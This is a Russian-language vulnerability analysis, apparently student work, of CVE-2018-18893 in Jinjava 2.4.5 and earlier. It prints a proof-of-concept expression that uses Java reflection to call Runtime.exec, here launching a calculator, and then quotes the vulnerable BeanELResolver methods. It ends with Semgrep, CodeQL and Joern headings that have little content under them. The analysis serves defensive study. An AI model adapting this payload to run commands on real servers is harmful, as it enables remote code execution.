**CVE-2018-18893 (Маджуга Богдан Андреевич)**

**Описание:**

Выполняем данный код используя **Jinjava** версия <= 2.4.5

```
Jinjava jinjava = new Jinjava();
JinjavaInterpreter interpreter = jinjava.newInterpreter(); 
Context context = interpreter.getContext(); context.put("obj",""); 
String poc ="''.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",''.getClass()).invoke(''.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),'/usr/bin/gnome-calculator')"; 
Object a = interpreter.resolveELExpression(poc, -1);
```

После запуска - на Linux машине запускается приложение калькулятор. 

Данная уязвимость отсылается к типу **Expression Resolver** уязвимостям и вообще говоря, для нее не предусмотрен конкретный набор методов, вызывающих ее. В процессе анализа уязвимости и кода, было замечено, что исходная строка конвертируется в метод, который вызывается системой. Следовательно необходимо было искать объекты абстрактного Java класса `Method` и вызов у них методов под названием `invoke()`

Первичным осмотром, искомый код нашелся в классе **BeanELResolver**, где нас интересует следующий код:

```
  @Override
  public Object invoke(
    ELContext context,
    Object base,
    Object method,
    Class<?>[] paramTypes,
    Object[] params
  ) {
    if (context == null) {
      throw new NullPointerException();
    }
    Object result = null;
    if (isResolvable(base)) {
      if (params == null) {
        params = new Object[0];
      }
      String name = method.toString();
      Method target = findMethod(base, name, paramTypes, params, params.length);
      if (target == null) {
        throw new MethodNotFoundException(
          "Cannot find method " +
          name +
          " with " +
          params.length +
          " parameters in " +
          base.getClass()
        );
      }
      try {
        result =
          target.invoke(
            base,
            coerceParams(getExpressionFactory(context), target, params)
          );
      } catch (InvocationTargetException e) {
        throw new ELException(e.getCause());
      } catch (IllegalAccessException e) {
        throw new ELException(e);
      }
      context.setPropertyResolved(true);
    }
    return result;
  }
```
```
  protected Method findMethod(
    Object base,
    String name,
    Class<?>[] types,
    Object[] params,
    int paramCount
  ) {
    if (types != null) {
      try {
        return findAccessibleMethod(base.getClass().getMethod(name, types));
      } catch (NoSuchMethodException e) {
        return null;
      }
    }
    Method varArgsMethod = null;
    for (Method method : base.getClass().getMethods()) {
      if (method.getName().equals(name)) {
        int formalParamCount = method.getParameterTypes().length;
        if (method.isVarArgs() && paramCount >= formalParamCount - 1) {
          varArgsMethod = method;
        } else if (paramCount == formalParamCount) {
          return findAccessibleMethod(method);
        }
      }
    }
    return varArgsMethod == null ? null : findAccessibleMethod(varArgsMethod);
  }
```

**Semgrep**

Для начала, запустим стандартный набор правил `semgrep ci` и посмотрим, что нам выдаст общий анализ.

**CodeQL**
**Joern**
importCode(inputPath="./jinjava", projectName="jinjava")
